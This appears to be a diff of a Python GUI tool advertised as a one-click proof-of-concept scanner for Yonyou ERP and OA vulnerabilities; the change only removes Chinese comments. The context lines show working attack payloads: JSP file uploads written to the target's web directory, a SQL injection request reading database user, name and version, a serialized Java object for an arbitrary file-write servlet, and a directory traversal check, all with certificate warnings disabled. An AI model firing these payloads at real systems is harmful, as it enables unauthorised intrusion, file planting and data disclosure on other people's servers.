@@ -1,10 +1,9 @@
-#1) 导入库
 import PySimpleGUI as sg
 import requests
 layout=[
             [sg.Text("用友系列一把梭--POC (点击确认后等待即可) ")],
             [sg.Text("仅限用友系列系统，其它系统会误报")],
-            [sg.Text("URL：  "),sg.InputText("http://127.0.0.1:8080")],  #Input输入框中的参数是默认参数
+            [sg.Text("URL：  "),sg.InputText("http://127.0.0.1:8080")],  
             [sg.Button("确认")]
                   ]
 
@@ -14,7 +13,6 @@ def poc_prop(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -32,7 +30,7 @@ def poc_filename(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
+    
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -50,7 +48,7 @@ def poc_BeanShell(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
+    
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -68,7 +66,7 @@ def poc_sql(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
+   
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -91,7 +89,7 @@ def poc_UploadFileData(url):
         'myFile': ('test.jpg', '<%out.print("test");%>', 'multipart/form-data')
     }
 
-    # 无视证书不报错
+    
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -110,7 +108,7 @@ def poc_manager(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
+ 
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -128,7 +126,7 @@ def poc_mgetSessionList(url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
     }
-    # 无视证书不报错
+ 
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -154,7 +152,7 @@ def poc_proxy(url):
         "Content-Type":"application/x-www-form-urlencoded"
     }
     data='''cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'''
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -177,7 +175,7 @@ def poc_accept(url):
         'file': ('images.jpg', '<% out.println("bea86d66a5278f9e6fa1112d2e2fcebf"); %>', 'image/jpeg'),
         'fname':(None,'/webapps/nc_web/iio.jsp','image/jpeg')
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -202,7 +200,7 @@ def poc_FileReceiveServlet(url):
         "Referer":"https://google.com"
     }
     data="\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -220,7 +218,7 @@ def poc_test(url):
     headers = {
         "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -238,7 +236,7 @@ def poc_KSOAUpload(url):
         "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
     }
     data ='''123456'''
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -257,7 +255,7 @@ def poc_wsdl(url):
     headers = {
         "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -274,7 +272,7 @@ def poc_setextno(url):
     headers = {
         "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -291,7 +289,7 @@ def poc_createMysql(url):
     headers = {
         "User-Agent": "Mozilla / 5.0(X11;Linuxx86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 74.0.3729.169Safari / 537.36"
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -315,7 +313,7 @@ def poc_thirdpartyController(url):
 
     }
     data='''method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'''
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -346,7 +344,7 @@ def poc_U8AppProxy(url):
     files = {
         'file': ('1.jsp', '<% out.println("yongyouu8");%>', 'image/jpeg'),
     }
-    # 无视证书不报错
+
     requests.packages.urllib3.disable_warnings()
     try:
         url=url[0]
@@ -360,12 +358,12 @@ def poc_U8AppProxy(url):
     print("用友GRP-U8 U8AppProxy任意文件上传漏洞检测完成-------验证方式： /yongyouU8_test.jsp")
 ################################################################################################################
 
-window=sg.Window('用友系列一把梭--POC(仅对用友系列)',layout) # 第一个参数是窗体的标题，第二个参数定义的布局
+window=sg.Window('用友系列一把梭--POC(仅对用友系列)',layout) 
 if __name__ == '__main__':
     while True:
-        event,values=window.read() #窗口的读取，有两个返回值(1.事件  2.值)
+        event,values=window.read() 
         print(event,values)
-        if event==None:  #窗口关闭事件
+        if event==None: 
             break
         poc_prop(values)  # prop.xml(数据库配置)
         poc_filename(values)  # 用友 ERP-NC NCFindWeb 目录遍历漏洞
